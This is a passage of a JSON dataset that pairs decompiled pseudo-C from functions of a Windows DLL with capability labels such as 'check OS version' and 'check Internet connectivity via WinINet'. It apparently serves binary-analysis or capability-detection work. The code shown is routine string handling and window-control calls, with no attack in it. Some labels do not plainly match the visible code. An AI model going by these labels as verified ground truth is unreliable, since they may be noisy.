2);\n    ppiVar8[2] = NULL;\n    ppiVar8[3] = 0x7;\n    *ppiVar8 = 0;\n    auStack200._0_8_ = SUB128(auVar4, 0);\n    auStack200._8_8_ = SUB168(auStack200 >> 0x40, 0);\n    if (auStack200._8_8_ - auStack200._0_8_ < 10) {\n        uStack968 = 10;\n        puVar12 = fcn.180013690(&uStack216, 10, 0, 0x1800f8508);\n        auVar28 = extraout_XMM0_05;\n    }\n    else {\n        auStack200 = CONCAT88(auStack200._8_8_, auStack200._0_8_ + 10);\n        puVar17 = &uStack216;\n        if (7 < auStack200._8_8_) {\n            puVar17 = puVar13;\n        }\n        fcn.1800ade80(puVar17 + auStack200._0_8_, 0x1800f8508, 0x14);\n        puVar17[auStack200._0_8_ + 10] = 0;\n        puVar12 = &uStack216;\n        auVar28 = extraout_XMM0_04;\n    }\n    auStack168 = auVar28 & 0x0;\n    uStack184._0_4_ = *puVar12;\n    uStack184._4_4_ = puVar12[1];\n    uStack176 = puVar12[2];\n    uStack172 = puVar12[3];\n    auStack168 = *(puVar12 + 4);\n    *(puVar12 + 4) = 0;\n    *(puVar12 + 6) = 7;\n    *puVar12 = 0;\n    piVar7 = puVar24 + 4;\n    uVar2 = puVar24[6];\n    if (7 < puVar24[7]) {\n        piVar7 = *piVar7;\n    }\n    if (auStack168._8_8_ - auStack168._0_8_ < uVar2) {\n        uStack968 = uVar2;\n        piVar7 = fcn.180013690(&uStack184, uVar2, 0, piVar7);\n        auVar28 = extraout_XMM0_07;\n    }\n    else {\n        auStack168 = CONCAT88(auStack168._8_8_, uVar2 + auStack168._0_8_);\n        puVar12 = &uStack184;\n        if (7 < auStack168._8_8_) {\n            puVar12 = CONCAT44(uStack184._4_4_, uStack184);\n        }\n        fcn.1800ade80(puVar12 + auStack168._0_8_ * 2, piVar7, uVar2 * 2);\n        *(puVar12 + (uVar2 + auStack168._0_8_) * 2) = 0;\n        piVar7 = &uStack184;\n        auVar28 = extraout_XMM0_06;\n    }\n    auStack664 = auVar28 & 0x0;\n    puVar17 = *piVar7;\n    uStack680._0_2_ = *piVar7;\n    uStack680._2_2_ = *piVar7 >> 0x10;\n    uStack680._4_4_ = *(piVar7 + 4);\n    uStack672 = *(piVar7 + 1);\n    uStack668 = *(piVar7 + 0xc);\n    auVar4 = **(piVar7 + 2);\n    auStack664 = *(piVar7 + 2);\n    piVar7[2] = 0;\n    piVar7[3] = 7;\n    *piVar7 = 0;\n    puVar13 = &uStack248;\n    if (7 < uStack224) {\n        puVar13 = CONCAT62(Stack246, uStack248);\n    }\n    auStack664._0_8_ = SUB128(auVar4, 0);\n    auStack664._8_8_ = SUB168(auStack664 >> 0x40, 0);\n    if (auStack664._8_8_ - auStack664._0_8_ < uVar25) {\n        uStack968 = uVar25;\n        piVar7 = fcn.180013690(&uStack680, uVar25, 0, puVar13);\n        uVar25 = uStack232;\n        auVar28 = extraout_XMM0_09;\n    }\n    else {\n        auStack664 = CONCAT88(auStack664._8_8_, auStack664._0_8_ + uVar25);\n        puVar15 = &uStack680;\n        if (7 < auStack664._8_8_) {\n            puVar15 = puVar17;\n        }\n        fcn.1800ade80(puVar15 + auStack664._0_8_, puVar13, uVar25 * 2);\n        puVar15[auStack664._0_8_ + uVar25] = 0;\n        piVar7 = &uStack680;\n        auVar28 = extraout_XMM0_08;\n    }\n    auStack896 = auVar28 & 0x0;\n    puVar13 = *piVar7;\n    uStack912._0_2_ = *piVar7;\n    uStack912._2_2_ = *piVar7 >> 0x10;\n    uStack908 = *(piVar7 + 4);\n    uStack904 = *(piVar7 + 1);\n    uStack900 = *(piVar7 + 0xc);\n    auVar4 = **(piVar7 + 2);\n    auStack896 = *(piVar7 + 2);\n    piVar7[2] = 0;\n    piVar7[3] = 7;\n    *piVar7 = 0;\n    auStack896._0_8_ = SUB128(auVar4, 0);\n    auStack896._8_8_ = SUB168(auStack896 >> 0x40, 0);\n    if (auStack896._8_8_ - auStack896._0_8_ < 0xe) {\n        uStack968 = 0xe;\n        puVar12 = fcn.180013690(&uStack912, 0xe, 0, 0x1800f84e8);\n        auVar28 = extraout_XMM0_11;\n    }\n    else {\n        auStack896 = CONCAT88(auStack896._8_8_, auStack896._0_8_ + 0xe);\n        puVar17 = &uStack912;\n        if (7 < auStack896._8_8_) {\n            puVar17 = puVar13;\n        }\n        fcn.1800ade80(puVar17 + auStack896._0_8_, 0x1800f84e8, 0x1c);\n        puVar17[auStack896._0_8_ + 0xe] = 0;\n        puVar12 = &uStack912;\n        auVar28 = extraout_XMM0_10;\n    }\n    auStack864 = auVar28 & 0x0;\n    uStack880._0_2_ = *puVar12;\n    uStack880._2_2_ = *puVar12 >> 0x10;\n    uStack880._4_4_ = puVar12[1];\n    uStack872 = puVar12[2];\n    uStack868 = puVar12[3];\n    auStack864 = *(puVar12 + 4);\n    *(puVar12 + 4) = 0;\n    *(puVar12 + 6) = 7;\n    *puVar12 = 0;\n    do {\n        uVar26 = uVar26 + 1;\n    } while (*(iVar22 + uVar26 * 2) != 0);\n    if (auStack864._8_8_ - auStack864._0_8_ < uVar26) {\n        uStack968 = uVar26;\n        puVar12 = fcn.180013690(&uStack880, uVar26, 0, iVar22);\n        auVar28 = extraout_XMM0_13;\n    }\n    else {\n        auStack864 = CONCAT88(auStack864._8_8_, uVar26 + auStack864._0_8_);\n        puVar13 = &uStack880;\n        if (7 < auStack864._8_8_) {\n            puVar13 = CONCAT44(uStack880._4_4_, CONCAT22(uStack880._2_2_, uStack880));\n        }\n        fcn.1800ade80(puVar13 + auStack864._0_8_, iVar22, uVar26 * 2);\n        puVar13[uVar26 + auStack864._0_8_] = 0;\n        puVar12 = &uStack880;\n        auVar28 = extraout_XMM0_12;\n    }\n    auStack832 = auVar28 & 0x0;\n    uStack848._0_2_ = *puVar12;\n    uStack848._2_2_ = *puVar12 >> 0x10;\n    uStack848._4_4_ = puVar12[1];\n    uStack840 = puVar12[2];\n    uStack836 = puVar12[3];\n    auStack832 = *(puVar12 + 4);\n    *(puVar12 + 4) = 0;\n    *(puVar12 + 6) = 7;\n    *puVar12 = 0;\n    puVar13 = &uStack248;\n    if (7 < uStack224) {\n        puVar13 = CONCAT62(Stack246, uStack248);\n    }\n    if (auStack832._8_8_ - auStack832._0_8_ < uVar25) {\n        uStack968 = uVar25;\n        puVar12 = fcn.180013690(&uStack848, uVar25, 0, puVar13);\n        uVar25 = uStack232;\n        auVar28 = extraout_XMM0_15;\n    }\n    else {\n        auStack832 = CONCAT88(auStack832._8_8_, auStack832._0_8_ + uVar25);\n        puVar17 = &uStack848;\n        if (7 < auStack832._8_8_) {\n            puVar17 = CONCAT44(uStack848._4_4_, CONCAT22(uStack848._2_2_, uStack848));\n        }\n        fcn.1800ade80(puVar17 + auStack832._0_8_, puVar13, uVar25 * 2);\n        puVar17[auStack832._0_8_ + uVar25] = 0;\n        puVar12 = &uStack848;\n        auVar28 = extraout_XMM0_14;\n    }\n    auStack800 = auVar28 & 0x0;\n    uStack816._0_2_ = *puVar12;\n    uStack816._2_2_ = *puVar12 >> 0x10;\n    uStack816._4_4_ = puVar12[1];\n    uStack808 = puVar12[2];\n    uStack804 = puVar12[3];\n    auStack800 = *(puVar12 + 4);\n    *(puVar12 + 4) = 0;\n    *(puVar12 + 6) = 7;\n    *puVar12 = 0;\n    if (auStack800._8_8_ - auStack800._0_8_ < 0xe) {\n        uStack968 = 0xe;\n        puVar12 = fcn.180013690(&uStack816, 0xe, 0, L\"HeaderRecords=\");\n        auVar28 = extraout_XMM0_17;\n    }\n    else {\n        auStack800 = CONCAT88(auStack800._8_8_, auStack800._0_8_ + 0xe);\n        puVar13 = &uStack816;\n        if (7 < auStack800._8_8_) {\n            puVar13 = CONCAT44(uStack816._4_4_, CONCAT22(uStack816._2_2_, uStack816));\n        }\n        fcn.1800ade80(puVar13 + auStack800._0_8_, L\"HeaderRecords=\", 0x1c);\n        puVar13[auStack800._0_8_ + 0xe] = 0;\n        puVar12 = &uStack816;\n        auVar28 = extraout_XMM0_16;\n    }\n    auStack768 = auVar28 & 0x0;\n    uStack784._0_2_ = *puVar12;\n    uStack784._2_2_ = *puVar12 >> 0x10;\n    uStack784._4_4_ = puVar12[1];\n    uStack776 = puVar12[2];\n    uStack772 = puVar12[3];\n    auStack768 = *(puVar12 + 4);\n    *(puVar12 + 4) = 0;\n    *(puVar12 + 6) = 7;\n    *puVar12 = 0;\n    uVar26 = uStack104;\n    puVar24 = &var_70h_2;\n    if (7 < var_58h_2) {\n        puVar24 = CONCAT62(var_70h_2._2_6_, var_70h_2);\n    }\n    if (auStack768._8_8_ - auStack768._0_8_ < uStack104) {\n        uStack968 = uStack104;\n        puVar12 = fcn.180013690(&uStack784, uStack104, 0, puVar24);\n        auVar28 = extraout_XMM0_19;\n    }\n    else {\n        auStack768 = CONCAT88(auStack768._8_8_, auStack768._0_8_ + uStack104);\n        puVar13 = &uStack784;\n        if (7 < auStack768._8_8_) {\n            puVar13 = CONCAT44(uStack784._4_4_, CONCAT22(uStack784._2_2_, uStack784));\n        }\n        fcn.1800ade80(puVar13 + auStack768._0_8_, puVar24, uStack104 * 2);\n        puVar13[auStack768._0_8_ + uVar26] = 0;\n        puVar12 = &uStack784;\n        auVar28 = extraout_XMM0_18;\n    }\n    auStack736 = auVar28 & 0x0;\n    uStack752._0_2_ = *puVar12;\n    uStack752._2_2_ = *puVar12 >> 0x10;\n    uStack752._4_4_ = puVar12[1];\n    uStack744 = puVar12[2];\n    uStack740 = puVar12[3];\n    auStack736 = *(puVar12 + 4);\n    *(puVar12 + 4) = 0;\n    *(puVar12 + 6) = 7;\n    *puVar12 = 0;\n    puVar13 = &uStack248;\n    if (7 < uStack224) {\n        puVar13 = CONCAT62(Stack246, uStack248);\n    }\n    if (auStack736._8_8_ - auStack736._0_8_ < uVar25) {\n        uStack968 = uVar25;\n        puVar12 = fcn.180013690(&uStack752, uVar25, 0, puVar13);\n        auVar28 = extraout_XMM0_21;\n    }\n    else {\n        auStack736 = CONCAT88(auStack736._8_8_, auStack736._0_8_ + uVar25);\n        puVar17 = &uStack752;\n        if (7 < auStack736._8_8_) {\n            puVar17 = CONCAT44(uStack752._4_4_, CONCAT22(uStack752._2_2_, uStack752));\n        }\n        fcn.1800ade80(puVar17 + auStack736._0_8_, puVar13, uVar25 * 2);\n        puVar17[auStack736._0_8_ + uVar25] = 0;\n        puVar12 = &uStack752;\n        auVar28 = extraout_XMM0_20;\n    }\n    auStack704 = auVar28 & 0x0;\n    uStack720._0_2_ = *puVar12;\n    uStack720._2_2_ = *puVar12 >> 0x10;\n    uStack720._4_4_ = puVar12[1];\n    uStack712 = puVar12[2];\n    uStack708 = puVar12[3];\n    auStack704 = *(puVar12 + 4);\n    *(puVar12 + 4) = 0;\n    *(puVar12 + 6) = 7;\n    *puVar12 = 0;\n    uVar25 = uStack136;\n    puVar13 = &uStack152;\n    if (7 < var_78h_2) {\n        puVar13 = CONCAT62(Stack150, uStack152);\n    }\n    if (auStack704._8_8_ - auStack704._0_8_ < uStack136) {\n        uStack968 = uStack136;\n        puVar24 = fcn.180013690(&uStack720, uStack136, 0, puVar13);\n    }\n    else {\n        auStack704 = CONCAT88(auStack704._8_8_, uStack136 + auStack704._0_8_);\n        puVar17 = &uStack720;\n        if (7 < auStack704._8_8_) {\n            puVar17 = CONCAT44(uStack720._4_4_, CONCAT22(uStack720._2_2_, uStack720));\n        }\n        fcn.1800ade80(puVar17 + auStack704._0_8_, puVar13, uStack136 * 2);\n        puVar17[uVar25 + auStack704._0_8_] = 0;\n        puVar24 = &uStack720;\n    }\n    pppppppuStack544 = *puVar24;\n    iStack536 = puVar24[1];\n    uStack528 = puVar24[2];\n    uStack520 = puVar24[3];\n    puVar24[2] = 0;\n    puVar24[3] = 7;\n    *puVar24 = 0;\n    fcn.18000d960(arg4, &pppppppuStack544);\n    if (uStack520 < 8) {\ncode_r0x000180048769:\n        if (7 < auStack704._8_8_) {\n            iVar23 = CONCAT44(uStack720._4_4_, CONCAT22(uStack720._2_2_, uStack720));\n            iVar22 = iVar23;\n            if ((0xfff < auStack704._8_8_ * 2 + 2) && (iVar22 = *(iVar23 + -8),  0x1f < (iVar23 - iVar22) - 8U))\n            goto code_r0x000180048aeb;\n            fcn.18008fb24(iVar22);\n        }\n        auStack704 = CONCAT88(CONCAT44(*0x18010190c, *0x180101908), CONCAT44(*0x180101904, *0x180101900));\n        uStack720._0_2_ = 0;\n        if (7 < auStack736._8_8_) {\n            iVar23 = CONCAT44(uStack752._4_4_, CONCAT22(uStack752._2_2_, uStack752));\n            iVar22 = iVar23;\n            if ((0xfff < auStack736._8_8_ * 2 + 2) && (iVar22 = *(iVar23 + -8),  0x1f < (iVar23 - iVar22) - 8U))\n            goto code_r0x000180048af1;\n            fcn.18008fb24(iVar22);\n        }\n        auStack736 = CONCAT88(CONCAT44(*0x18010190c, *0x180101908), CONCAT44(*0x180101904, *0x180101900));\n        uStack752._0_2_ = 0;\n        if (7 < auStack768._8_8_) {\n            iVar23 = CONCAT44(uStack784._4_4_, CONCAT22(uStack784._2_2_, uStack784));\n            iVar22 = iVar23;\n            if ((0xfff < auStack768._8_8_ * 2 + 2) && (iVar22 = *(iVar23 + -8),  0x1f < (iVar23 - iVar22) - 8U))\n            goto code_r0x000180048af7;\n            fcn.18008fb24(iVar22);\n        }\n        auStack768 = CONCAT88(CONCAT44(*0x18010190c, *0x180101908), CONCAT44(*0x180101904, *0x180101900));\n        uStack784._0_2_ = 0;\n        if (7 < auStack800._8_8_) {\n            iVar23 = CONCAT44(uStack816._4_4_, CONCAT22(uStack816._2_2_, uStack816));\n            iVar22 = iVar23;\n            if ((0xfff < auStack800._8_8_ * 2 + 2) && (iVar22 = *(iVar23 + -8),  0x1f < (iVar23 - iVar22) - 8U))\n            goto code_r0x000180048afd;\n            fcn.18008fb24(iVar22);\n        }\n        auStack800 = CONCAT88(CONCAT44(*0x18010190c, *0x180101908), CONCAT44(*0x180101904, *0x180101900));\n        uStack816._0_2_ = 0;\n        if (7 < auStack832._8_8_) {\n            iVar23 = CONCAT44(uStack848._4_4_, CONCAT22(uStack848._2_2_, uStack848));\n            iVar22 = iVar23;\n            if ((0xfff < auStack832._8_8_ * 2 + 2) && (iVar22 = *(iVar23 + -8),  0x1f < (iVar23 - iVar22) - 8U))\n            goto code_r0x000180048b03;\n            fcn.18008fb24(iVar22);\n        }\n        auStack832 = CONCAT88(CONCAT44(*0x18010190c, *0x180101908), CONCAT44(*0x180101904, *0x180101900));\n        uStack848._0_2_ = 0;\n        if (7 < auStack864._8_8_) {\n            iVar23 = CONCAT44(uStack880._4_4_, CONCAT22(uStack880._2_2_, uStack880));\n            iVar22 = iVar23;\n            if ((0xfff < auStack864._8_8_ * 2 + 2) && (iVar22 = *(iVar23 + -8),  0x1f < (iVar23 - iVar22) - 8U))\n            goto code_r0x000180048b09;\n            fcn.18008fb24(iVar22);\n        }\n        auStack864 = CONCAT88(CONCAT44(*0x18010190c, *0x180101908), CONCAT44(*0x180101904, *0x180101900));\n        uStack880._0_2_ = 0;\n        if (7 < auStack896._8_8_) {\n            iVar23 = CONCAT44(uStack908, CONCAT22(uStack912._2_2_, uStack912));\n            iVar22 = iVar23;\n            if (0xfff < auStack896._8_8_ * 2 + 2) {\n                iVar22 = *(iVar23 + -8);\n                if (0x1f < (iVar23 - iVar22) - 8U) {\n                    fcn.1800b3528(CONCAT44(*0x180101904, *0x180101900), iVar22, auStack896._8_8_ * 2 + 0x29);\ncode_r0x000180048a7f:\n                    fcn.1800b3528();\ncode_r0x000180048a85:\n                    fcn.1800b3528();\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n            }\n            fcn.18008fb24(iVar22);\n        }\n        auStack896._0_8_ = CONCAT44(*0x180101904, *0x180101900);\n        auStack896 = CONCAT412(*0x18010190c, CONCAT48(*0x180101908, auStack896._0_8_));\n        uStack912._0_2_ = 0;\n        fcn.180003e40(&uStack680);\n        fcn.180003e40(&uStack184);\n        fcn.180003e40(&uStack216);\n        fcn.180003e40(auStack416);\n        fcn.180003e40(&uStack488);\n        fcn.180003e40(&uStack944);\n        fcn.180003e40(&pppppppuStack608);\n        fcn.180003e40(auStack648);\n        fcn.180003e40(&uStack576);\n        fcn.180003e40(auStack448);\n        fcn.180003e40(&uStack152);\n        fcn.180003e40(&var_70h_2);\n        fcn.180003e40(&uStack248);\n        fcn.18008fb00(var_bp_38h ^ auStack1000);\n        return;\n    }\n    pppppppuVar11 = pppppppuStack544;\n    if ((uStack520 * 2 + 2 < 0x1000) ||\n       (pppppppuVar11 = pppppppuStack544[-1],  pppppppuStack544 + (-8 - pppppppuVar11) < 0x20)) {\n        fcn.18008fb24(pppppppuVar11);\n        goto code_r0x000180048769;\n    }\ncode_r0x000180048ae5:\n    fcn.1800b3528();\ncode_r0x000180048aeb:\n    fcn.1800b3528();\ncode_r0x000180048af1:\n    fcn.1800b3528();\ncode_r0x000180048af7:\n    fcn.1800b3528();\ncode_r0x000180048afd:\n    fcn.1800b3528();\ncode_r0x000180048b03:\n    fcn.1800b3528();\ncode_r0x000180048b09:\n    fcn.1800b3528();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 19031
    },
    "18004b56": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18004b560(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int64_t arg1_00;\n    char in_DL;\n    ulong uVar3;\n    int64_t iVar4;\n    uchar auStack120 [32];\n    ushort uStack88;\n    unkbyte6 Stack86;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    ulong uStack56;\n    int16_t aiStack48 [12];\n    uint64_t uStack24;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack120;\n    uVar3 = 0x2716;\n    if (in_DL != '\\0') {\n        uVar3 = 0x2713;\n    }\n    (**0x1800de728)(*(arg1 + 8), uVar3, aiStack48, 7);\n    uStack72 = *0x180101900;\n    uStack68 = *0x180101904;\n    uStack64 = *0x180101908;\n    uStack60 = *0x18010190c;\n    uStack88 = 0;\n    iVar4 = -1;\n    do {\n        iVar4 = iVar4 + 1;\n    } while (aiStack48[iVar4] != 0);\n    fcn.180010d70(&uStack88, aiStack48, iVar4);\n    fcn.180067a70(&uStack88, 0x10);\n    if (7 < CONCAT44(uStack60, uStack64)) {\n        iVar4 = CONCAT44(uStack60, uStack64) * 2;\n        iVar2 = CONCAT62(Stack86, uStack88);\n        arg1_00 = iVar2;\n        if (0xfff < iVar4 + 2U) {\n            arg1_00 = *(iVar2 + -8);\n            if (0x1f < (iVar2 - arg1_00) - 8U) {\n                fcn.1800b3528(arg1_00, iVar4 + 0x29);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    fcn.18008fb00(uStack24 ^ auStack120);\n    return;\n}\n",
        "token_count": 530
    },
    "18004b73": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18004b730(int64_t arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    ulong uVar3;\n    uchar auStack152 [32];\n    uchar auStack120 [16];\n    uchar auStack104 [16];\n    uchar auStack88 [16];\n    uchar auStack72 [16];\n    uchar auStack56 [16];\n    ulong uStack40;\n    uint uStack32;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack152;\n    fcn.180068540(*(arg1 + 8), 0x271b);\n    iVar1 = (**0x1800de740)(*(arg1 + 8), 0x2718);\n    if (iVar1 == 1) {\n        fcn.180068600(*(arg1 + 8), 0x271b);\n    }\n    iVar1 = (**0x1800de740)(*(arg1 + 8), 0x2719);\n    if (iVar1 == 1) {\n        uVar2 = (**0x1800de798)(*(arg1 + 8), 0x271b);\n        auStack120 = ZEXT816(0);\n        uStack40 = 0;\n        auStack104 = ZEXT816(0);\n        uStack32 = 0;\n        auStack88 = ZEXT816(0);\n        auStack72 = ZEXT816(0);\n        auStack56 = ZEXT816(0);\n        uVar3 = (**0x1800de7f0)(uVar2, 0x31, 0, 0);\n        iVar1 = (**0x1800de090)(uVar3, 0x5c, auStack120);\n        if (iVar1 != 0) {\n            uVar3 = (**0x1800de0b8)(auStack120);\n            (**0x1800de7f0)(uVar2, 0x30, uVar3);\n        }\n    }\n    fcn.18008fb00(uStack24 ^ auStack152);\n    return;\n}\n",
        "token_count": 472
    },
    "18004cd3": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nvoid fcn.18004cd30(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    ushort *puVar5;\n    uint *puVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    ulong uStack88;\n    uint64_t uStack72;\n    uint uStack64;\n    uint uStack60;\n    ushort uStack56;\n    ushort uStack54;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    ulong uStack40;\n    uint64_t uStack32;\n    ulong uStack24;\n    \n    uStack24 = 0xfffffffffffffffe;\n    if (*(arg1 + 0xb5) == '\\0') {\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = *0x180101908;\n        uStack60 = *0x18010190c;\n        uStack88._0_2_ = 0;\n        fcn.180010d70(&uStack88, 0x1800fa1e8, 0x1c);\n        uVar4 = uStack72;\n        if (CONCAT44(uStack60, uStack64) == uStack72) {\n            puVar6 = fcn.180013690(&uStack88, 1, 0, 0x1800f79bc);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar5 = &uStack88;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                puVar5 = CONCAT62(uStack88._2_6_, uStack88);\n            }\n            puVar5[uVar4] = 0x2a;\n            puVar5[uVar1] = 0;\n            puVar6 = &uStack88;\n        }\n        uStack56 = *puVar6;\n        uStack54 = *puVar6 >> 0x10;\n        uStack52 = puVar6[1];\n        uStack48 = puVar6[2];\n        uStack44 = puVar6[3];\n        uStack40 = *(puVar6 + 4);\n        uStack32 = *(puVar6 + 6);\n        *(puVar6 + 4) = 0;\n        *(puVar6 + 6) = 7;\n        *puVar6 = 0;\n        puVar5 = &uStack56;\n        if (7 < uStack32) {\n            puVar5 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x2441, puVar5);\n        if (uStack32 < 8) {\ncode_r0x00018004ce86:\n            uStack40 = CONCAT44(*0x180101904, *0x180101900);\n            uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack56 = 0;\n            if (CONCAT44(uStack60, uStack64) < 8) {\ncode_r0x00018004ced7:\n                fcn.180068600(*(arg1 + 0x18), 0x2441);\n                goto code_r0x00018004cee5;\n            }\n            iVar8 = CONCAT62(uStack88._2_6_, uStack88);\n            iVar7 = iVar8;\n            if ((CONCAT44(uStack60, uStack64) * 2 + 2 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)\n               ) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x00018004ced7;\n            }\n        }\n        else {\n            iVar8 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            iVar7 = iVar8;\n            if ((uStack32 * 2 + 2 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x00018004ce86;\n            }\ncode_r0x00018004d213:\n            fcn.1800b3528();\n        }\n        fcn.1800b3528();\ncode_r0x00018004d21f:\n        fcn.1800b3528();\n    }\n    else {\n        (**0x1800de788)(*(arg1 + 0x18), 0x2441, 0x1800fa198);\n        fcn.180068540(*(arg1 + 0x18), 0x2441);\ncode_r0x00018004cee5:\n        if (*(arg1 + 0xb6) != '\\0') {\n            (**0x1800de788)(*(arg1 + 0x18), 0x23f7, 0x1800fa228);\n            fcn.180068540(*(arg1 + 0x18), 0x23f7);\ncode_r0x00018004d070:\n            if (*(arg1 + 0x30) != '\\0') {\n                (**0x1800de788)(*(arg1 + 0x18), 0x2419, 0x1800fa238);\n                fcn.180068540(*(arg1 + 0x18), 0x2419);\n                return;\n            }\n            uStack72 = CONCAT44(*0x180101904, *0x180101900);\n            uStack64 = *0x180101908;\n            uStack60 = *0x18010190c;\n            uStack88._0_2_ = 0;\n            fcn.180010d70(&uStack88, 0x1800fa258, 6);\n            uVar4 = uStack72;\n            if (CONCAT44(uStack60, uStack64) == uStack72) {\n                puVar6 = fcn.180013690(&uStack88, 1, 0, 0x1800f79dc);\n            }\n            else {\n                uVar1 = uStack72 + 1;\n                uStack72 = uVar1;\n                puVar5 = &uStack88;\n                if (7 < CONCAT44(uStack60, uStack64)) {\n                    puVar5 = CONCAT62(uStack88._2_6_, uStack88);\n                }\n                puVar5[uVar4] = 0x2a;\n                puVar5[uVar1] = 0;\n                puVar6 = &uStack88;\n            }\n            uStack56 = *puVar6;\n            uStack54 = *puVar6 >> 0x10;\n            uStack52 = puVar6[1];\n            uStack48 = puVar6[2];\n            uStack44 = puVar6[3];\n            uStack40 = *(puVar6 + 4);\n            uStack32 = *(puVar6 + 6);\n            *(puVar6 + 4) = 0;\n            *(puVar6 + 6) = 7;\n            *puVar6 = 0;\n            puVar5 = &uStack56;\n            if (7 < uStack32) {\n                puVar5 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            }\n            (**0x1800de788)(*(arg1 + 0x18), 0x2419, puVar5);\n            if (7 < uStack32) {\n                iVar8 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n                iVar7 = iVar8;\n                if ((0xfff < uStack32 * 2 + 2) && (iVar7 = *(iVar8 + -8),  0x1f < (iVar8 - iVar7) - 8U))\n                goto code_r0x00018004d22b;\n                fcn.18008fb24(iVar7);\n            }\n            uStack40 = CONCAT44(*0x180101904, *0x180101900);\n            uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack56 = 0;\n            if (CONCAT44(uStack60, uStack64) < 8) goto code_r0x00018004d1e6;\n            iVar7 = CONCAT44(uStack60, uStack64) * 2;\n            iVar3 = CONCAT62(uStack88._2_6_, uStack88);\n            iVar8 = iVar3;\n            if (0xfff < iVar7 + 2U) {\n                iVar8 = *(iVar3 + -8);\n                if (0x1f < (iVar3 - iVar8) - 8U) {\n                    fcn.1800b3528(uStack40, iVar8, iVar7 + 0x29);\n                    goto code_r0x00018004d213;\n                }\n            }\n            fcn.18008fb24(iVar8);\ncode_r0x00018004d1e6:\n            fcn.180068600(*(arg1 + 0x18), 0x2419);\n            return;\n        }\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = *0x180101908;\n        uStack60 = *0x18010190c;\n        uStack88._0_2_ = 0;\n        fcn.180010d70(&uStack88, 0x1800fa248, 6);\n        uVar4 = uStack72;\n        if (CONCAT44(uStack60, uStack64) == uStack72) {\n            puVar6 = fcn.180013690(&uStack88, 1, 0, 0x1800f79cc);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar5 = &uStack88;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                puVar5 = CONCAT62(uStack88._2_6_, uStack88);\n            }\n            puVar5[uVar4] = 0x2a;\n            puVar5[uVar1] = 0;\n            puVar6 = &uStack88;\n        }\n        uStack56 = *puVar6;\n        uStack54 = *puVar6 >> 0x10;\n        uStack52 = puVar6[1];\n        uStack48 = puVar6[2];\n        uStack44 = puVar6[3];\n        uStack40 = *(puVar6 + 4);\n        uStack32 = *(puVar6 + 6);\n        *(puVar6 + 4) = 0;\n        *(puVar6 + 6) = 7;\n        *puVar6 = 0;\n        puVar5 = &uStack56;\n        if (7 < uStack32) {\n            puVar5 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x23f7, puVar5);\n        if (7 < uStack32) {\n            iVar8 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            iVar7 = iVar8;\n            if ((uStack32 * 2 + 2 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x00018004d011;\n            }\n            goto code_r0x00018004d21f;\n        }\ncode_r0x00018004d011:\n        uStack40 = CONCAT44(*0x180101904, *0x180101900);\n        uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack56 = 0;\n        if (CONCAT44(uStack60, uStack64) < 8) {\ncode_r0x00018004d062:\n            fcn.180068600(*(arg1 + 0x18), 0x23f7);\n            goto 